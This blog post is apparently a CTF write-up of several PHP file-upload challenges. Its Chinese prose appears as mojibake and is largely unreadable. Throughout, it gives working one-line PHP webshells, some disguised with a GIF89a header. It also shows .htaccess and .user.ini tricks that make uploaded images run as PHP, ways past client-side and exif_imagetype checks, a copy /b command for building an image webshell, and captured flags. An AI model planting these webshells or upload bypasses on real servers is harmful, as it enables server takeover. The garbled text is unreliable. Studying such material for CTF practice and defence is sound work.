---
layout: post
title:  UPLOAD
date:   2021-07-24 00:01:01 +0300
image:  2021-07-24-flowers.jpg
tags:   [ctf,web,upload]
---

CTFæ–‡ä»¶ä¸Šä¼ é¢˜ä¸­å¸¸ç”¨çš„phpæ‹“å±•å:

- åˆ©ç”¨ä¸­é—´ä»¶è§£ææ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå®æˆ˜å¸¸ç”¨
- ä¸Šä¼ .user.iniæˆ–.htaccesså°†åˆæ³•æ‹“å±•åæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æ
- %00æˆªæ–­ç»•è¿‡
- php3æ–‡ä»¶
- php4æ–‡ä»¶
- php5æ–‡ä»¶
- php7æ–‡ä»¶
- phtmlæ–‡ä»¶
- phpsæ–‡ä»¶
- phtæ–‡ä»¶

### [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload

å…ˆä¸Šä¼ ä¸€ä¸ªphp

```assembly
<?php @eval($_POST['hacker']); ?>
```

æ˜¾ç¤º

`Not image!`

è¯•ä¸€ä¸‹phtmlï¼Œphtmlä¸€èˆ¬æ˜¯æŒ‡åµŒå…¥äº†phpä»£ç çš„htmlæ–‡ä»¶ï¼Œä½†æ˜¯åŒæ ·ä¹Ÿä¼šä½œä¸ºphpè§£æ

```assembly
<script language="php">eval($_POST['shell']);</script> 
```

åŒæ—¶burpsuiteæ‹¦æˆªï¼Œå°†Content-Typeæ”¹ä¸º`image/jpg`

æ˜¾ç¤º

`Don't lie to me, it's not image at all!!!`

ä¿®æ”¹æ–‡ä»¶å¤´ï¼Œé‚£å°±åŠ ä¸ŠGIF89a

```assembly
GIF89a
<script language="php">eval($_POST['melody']);</script> 
```

å†ä¼ ï¼Œå°†Content-Typeæ”¹ä¸º`image/jpg`

ä¸Šä¼ æˆåŠŸï¼Œæ˜¾ç¤º

`ä¸Šä¼ æ–‡ä»¶å: b.phtml`

çŒœæµ‹ä¸Šä¼ åçš„æ–‡ä»¶åœ¨/upload/b.phtmlï¼Œæµè§ˆå™¨è¾“å…¥è¯¥åœ°å€éªŒè¯ï¼Œæœ‰æ˜¾ç¤ºï¼Œè¯´æ˜æ˜¯è¯¥è·¯å¾„ã€‚

ä½¿ç”¨èšå‰‘è¿æ¥ã€‚

flag{51e6c344-c9bc-4568-ac5b-7e30ed4e4ce5}

### [ACTF2020 æ–°ç”Ÿèµ›]Upload

ä¼ äº†ä¸€ä¸ªphtmlæ–‡ä»¶ï¼Œ

```assembly
GIF89a
<script language="php">eval($_POST['melody']);</script> 
```

æ˜¾ç¤º

`è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ jpgã€pngã€gifç»“å°¾çš„å›¾ç‰‡å™¢ï¼`

F12å‘ç°æ£€æŸ¥åœ¨å‰ç«¯ï¼Œ`/js/main.js`

```assembly
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("ç’‡çƒ½â‚¬å¤‹å«¨ç‘•ä½·ç¬‚æµ¼çŠµæ®‘é‚å›¦æ¬¢!");
        return false;
    }
    //ç€¹æ°«ç®Ÿéä½½î†æ¶“å©ç´¶é¨å‹¬æƒæµ å‰è¢«é¨ï¿½
    var allow_ext = ".jpg|.png|.gif";
    //é»æ„¬å½‡æ¶“å©ç´¶é‚å›¦æ¬¢é¨å‹­è¢«é¨ï¿½
    var ext_name = file.substring(file.lastIndexOf("."));
    //é’ã‚†æŸ‡æ¶“å©ç´¶é‚å›¦æ¬¢ç»«è¯²ç€·é„îˆšæƒéä½½î†æ¶“å©ç´¶
    if (allow_ext.indexOf(ext_name) == -1) {
        var errMsg = "ç’‡ãƒ¦æƒæµ æœµç¬‰éä½½î†æ¶“å©ç´¶é”›å²ƒî‡¬æ¶“å©ç´¶jpgéŠ†ä¹¸ngéŠ†ä¹¬ifç¼æ’³ç†¬é¨å‹«æµ˜é—å›§æ«Œé”›ï¿½";
        alert(errMsg);
        return false;
    }
}
```

ç›´æ¥ä¿®æ”¹å‰ç«¯ï¼Œåˆ é™¤formæ ‡ç­¾çš„`onsubmit="return checkFile()"`ï¼Œä¸è¡Œï¼ŒåŸæ¥æ˜¯è¦åœ¨consoleé‡Œå°†checkFileå‡½æ•°ç½®ç©º

```assembly
checkFile={}
```

ä¸Šä¼ åˆšæ‰çš„æ–‡ä»¶ï¼Œæ˜¾ç¤º

`å˜¿ä¼™è®¡ï¼Œä½ å‘ç°å®ƒäº†ï¼`

`Upload Success! Look here~ ./uplo4d/085efa22dc274944b80b550bc5cf7deb.phtml`

èšå‰‘è¿æ¥ã€‚

flag{24b96f03-50ee-42d2-bd5f-d502886b425d}

### [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢

ä¸Šä¼ ä¸€å¥è¯é©¬ï¼Œåç¼€ä¿å­˜ä¸ºjpg

```assembly
<?php @eval($_POST['melody']) ?>
```

ä¸Šä¼ æˆåŠŸï¼Œè·¯å¾„`upload/b7efa9c9c1b76fa145cbafb014376450/a.jpg`

ç„¶åä¸Šä¼ æ–‡ä»¶.htaccessï¼Œå°†.jpgè§£ææˆ.php

```assembly
<FilesMatch "1.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

éœ€è¦æŠŠContent-Typeæ”¹ä¸ºï¼š`image/png`ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæ”¹æˆ`image/jpg`ä¸è¡Œã€‚

èšå‰‘è¿æ¥

flag{bbe96ed8-0dd2-47a7-b1da-32b88e66aceb}

### [GXYCTF2019]BabyUpload

è¯•äº†ä¸€ä¸‹ä¸Šä¼ æ ¼å¼ä¸æ”¯æŒ.jpgå’Œ.gifï¼Œä½†æ˜¯å¯ä»¥ç”¨png

ä¸Šä¼ æ™®é€šçš„ä¸€å¥è¯ä¼šè¢«å’Œè°æ‰ï¼Œå¤§ä½¬è¯´å¯èƒ½è¿‡æ»¤äº† <?  

ç”¨jså¼•ç”¨phpå¯ä»¥ç»•è¿‡è¿‡æ»¤

```assembly
GIF89a
<script language="php">eval($_POST['shell']);</script> 
```

è¦æŠŠContent-Typeæ”¹ä¸ºï¼š`image/jpeg`

ä¸Šä¼ æˆåŠŸ

`/var/www/html/upload/100fbac94abfa6b2bc897ece753c008b/js.png succesfully uploaded!`

ä¸Šä¼ .htaccessæ–‡ä»¶

Content-Typeæ”¹ä¸ºï¼š`image/jpeg`

flag{64bfb6f3-2b52-4dac-8601-74b6761f2828}

### [SUCTF 2019]CheckIn

ä¸Šä¼ äº†ä¸€ä¸ª.phtmlæ–‡ä»¶ï¼Œæ˜¾ç¤º

`illegal suffix!`

æ”¹ä¸ºpngä¸Šä¼ ï¼Œæ˜¾ç¤º

`<? in contents!`

å†…å®¹æ”¹ä¸º

```assembly
GIF89a
<script language="php">eval($_POST['shell']);</script> 
```

ä¸Šä¼ ï¼Œæ˜¾ç¤º

`Your dir uploads/a2dac6bd7c61bc58189816aab5957f01
Your files :
array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(5) "s.png" }`

ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œæ˜¾ç¤º

`exif_imagetype:not image!`

è¯´æ˜ç½‘é¡µåç«¯ä½¿ç”¨**exif_imagetype**æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹

ç»™ä¸Šä¼ æ–‡ä»¶åŠ ä¸Šç›¸åº”çš„å¹»æ•°å¤´å­—èŠ‚å°±å¯ä»¥ç»•è¿‡ï¼š

- JPG ï¼šFF D8 FF E0 00 10 4A 46 49 46
- GIF(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š47 49 46 38 39 61
- PNGï¼š 89 50 4E 47

ä¸Šä¼ .htaccessï¼Œæ˜¾ç¤º

`Your dir uploads/a2dac6bd7c61bc58189816aab5957f01
Your files :
array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".htaccess" [3]=> string(9) "index.php" }`

èšå‰‘è¿æ¥ï¼Œå¤±è´¥

åŸæ¥ï¼Œè¿™ä¸ªæœåŠ¡å™¨æ˜¯nginxï¼Œè€Œ.htaccessæ˜¯é’ˆå¯¹apacheçš„

çœ‹wp

`.user.ini`ã€‚å®ƒæ¯”`.htaccess`ç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx/apache/IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚

php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼š`PHP_INI_SYSTEM`ã€`PHP_INI_PERDIR`ã€`PHP_INI_ALL`ã€`PHP_INI_USER`ã€‚

`.user.ini`å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®ã€‚

å®é™…ä¸Šï¼Œé™¤äº†`PHP_INI_SYSTEM`ä»¥å¤–çš„æ¨¡å¼ï¼ˆåŒ…æ‹¬PHP_INI_ALLï¼‰éƒ½æ˜¯å¯ä»¥é€šè¿‡.user.iniæ¥è®¾ç½®çš„ã€‚è€Œä¸”ï¼Œå’Œ`php.ini`ä¸åŒçš„æ˜¯ï¼Œ`.user.ini`æ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´ä¿®æ”¹äº†`.user.ini`åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…`user_ini.cache_ttl`æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€‚

| åå­—              | é»˜è®¤ | å¯ä¿®æ”¹èŒƒå›´     | æ›´æ–°æ—¥å¿— |
| :---------------- | :--- | :------------- | :------- |
| auto_append_file  | NULL | PHP_INI_PERDIR |          |
| auto_prepend_file | NULL | PHP_INI_PERDIR |          |

auto_append_file

æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š

```assembly
auto_prepend_file=shell.jpg
```

winhexæ·»åŠ æ–‡ä»¶å¤´ï¼Œä¸Šä¼ ï¼Œæ˜¾ç¤º

`Your dir uploads/a2dac6bd7c61bc58189816aab5957f01
Your files :
array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".user.ini" [3]=> string(9) "index.php" }`

åˆ¶ä½œå›¾ç‰‡é©¬

s.php

```assembly
<script language="php">eval($_POST['a']);</script>
```

```assembly
copy hair.jpg/a + s.php/b shell.jpg
```

ä¸Šä¼ å›¾ç‰‡é©¬

`Your dir uploads/a2dac6bd7c61bc58189816aab5957f01
Your files :
array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".user.ini" [3]=> string(9) "index.php" [4]=> string(9) "shell.jpg" }`

èšå‰‘è¿æ¥

`http://969943a9-a160-4cf8-b5bb-874d44cba7b8.node4.buuoj.cn:81/uploads/a2dac6bd7c61bc58189816aab5957f01/index.php`

å¾—åˆ°flag

flag{534ef74d-fcbd-4d49-83ed-36953200a311}